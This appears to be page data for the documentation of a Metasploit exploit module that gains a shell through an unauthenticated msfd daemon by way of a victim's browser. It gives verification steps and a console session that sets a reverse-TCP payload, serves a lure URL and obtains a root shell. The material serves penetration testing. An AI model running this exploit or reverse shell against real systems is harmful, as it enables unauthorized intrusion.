{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/browser/msfd_rce_browser","result":{"data":{"moduleMetadataJson":{"id":"eddb1231-2d8c-5848-bffa-5baf09bcb393","name":"Metasploit msfd Remote Code Execution via Browser","fullname":"exploit/multi/browser/msfd_rce_browser","description":"Metasploit's msfd-service makes it possible to get a msfconsole-like\n      interface over a TCP socket. This module connects to the msfd-socket\n      through the victim's browser.\n\n      To execute msfconsole-commands in JavaScript from a web application,\n      this module places the payload in the POST-data. These POST-requests\n      can be sent cross-domain and can therefore be sent to localhost on the\n      victim's machine. The msfconsole-command to execute code is 'rbi -e\n      \"CODE\"'.\n\n      Exploitation when the browser is running on Windows is unreliable and\n      the exploit is only usable when IE is used and the quiet-flag has been\n      passed to msf-daemon.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/multi/browser/msfd_rce_browser","documentationSlug":"/modules/documentation/exploit/multi/browser/msfd_rce_browser","referencesSlug":"/modules/references/exploit/multi/browser/msfd_rce_browser"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module connects to the Metasploit msf daemon and uses the ruby interpreter\nto achieve a shell. This module can be used when the vulnerable service is only\nlistening on localhost and the attacker has not achieved a foothold on the\nmachine. To achieve code execution, the data is sent from the victim's browser.\nTo achieve this, the victim must visit the attacker's web site.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"https://github.com/rapid7/metasploit-framework\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Metasploit</a> has a legacy method\nof providing remote access. The msf daemon provides no means of authentication\nand is therefore vulnerable against an attacker who has IP access to the daemon.\nIn those cases where the daemon is listening on localhost, we take advantage of\nthe fact that the victim's web browser has IP access to the daemon.</p>\n<p>Because the msfconsole-program is line-based, it is possible to successfully\nsend commands through the HTTP-protocol. This module takes advantage of this by\nplacing the msfconsole-command in the POST-data of a HTTP-request. Since these\nPOST-requests are considered safe to send cross-domain, it is possible to send\nthem from the attacker's web application and to localhost using the victim's\nbrowser.</p>\n<p>All versions of Metasploit are affected by this module, however testing has only\nbeen performed on the following targets:</p>\n<ul>\n<li>Metasploit 5.0.0 on Ubuntu 16.04 (using Firefox and Chrome)</li>\n<li>Metasploit 4.16.51 on Windows 7 (using IE, exploitation failed in Firefox and\nChrome)</li>\n</ul>\n<p><strong><em>NB!</em></strong> Exploitation on Windows had a higher degree of success, when the\nquiet-flag was sent to the msf daemon. On Linux, it made no difference.</p>\n<p>Source code and installers:</p>\n<ul>\n<li><a href=\"https://github.com/rapid7/metasploit-framework\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Source Code Repository</a></li>\n<li><a href=\"https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Installers</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start the vulnerable service <code class=\"language-text\">msfd -q -f</code></li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/multi/browser/msfd_rce_browser</code></li>\n<li>Do: <code class=\"language-text\">set REMOTE_IP [IP]</code> (default: <code class=\"language-text\">127.0.0.1</code>)</li>\n<li>Do: <code class=\"language-text\">set RPORT [PORT]</code> (default: <code class=\"language-text\">55554</code>)</li>\n<li>Do: <code class=\"language-text\">set PAYLOAD [PAYLOAD]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Do: Visit the listed URL from the victim's machine</li>\n<li>You should get a shell</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>Options unique for this module is described below.</p>\n<p>  <strong>REMOTE_IP</strong></p>\n<p>  IP to target when running inside the victim's browser.</p>\n<p>  <strong>REMOTE_PORT</strong></p>\n<p>  Remote port the vulnerable service is running at, default is 55554.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"through-the-victims-browser\" style=\"position:relative;\"><a href=\"#through-the-victims-browser\" aria-label=\"through the victims browser permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Through the victim's browser</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"> msf5 &gt; use exploit/multi/browser/msfd_rce_browser\n msf5 exploit(multi/browser/msfd_rce_browser) &gt; set payload ruby/shell_reverse_tcp\n payload =&gt; ruby/shell_reverse_tcp\n msf5 exploit(multi/browser/msfd_rce_browser) &gt; set lhost 192.168.0.17\n lhost =&gt; 192.168.0.17\n msf5 exploit(multi/browser/msfd_rce_browser) &gt; set lport 443\n lport =&gt; 443\n msf5 exploit(multi/browser/msfd_rce_browser) &gt; exploit \n [*] Exploit running as background job 0.\n\n [-] Handler failed to bind to 192.168.0.17:443:-  -\n [*] Started reverse TCP handler on 0.0.0.0:443 \n msf5 exploit(multi/browser/msfd_rce_browser) &gt; [*] Using URL:\n http://0.0.0.0:8080/J5ras6oYftFWW4\n [*] Local IP: http://172.17.0.2:8080/J5ras6oYftFWW4\n [*] Server started.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Visit the web site listed in a browser on the victim's machine and you should\nget the output below.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"> [*] 192.168.0.17     msfd_rce_browser - 192.168.0.17     msfd_rce_browser\n Sending HTML...\n [*] Command shell session 4 opened (172.17.0.2:443 -&gt; 192.168.0.17:48376) at 2018-04-22 19:15:07 +0000\n id\n [*] exec: id\n\n uid=0(root) gid=0(root) groups=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"eddb1231-2d8c-5848-bffa-5baf09bcb393"}}}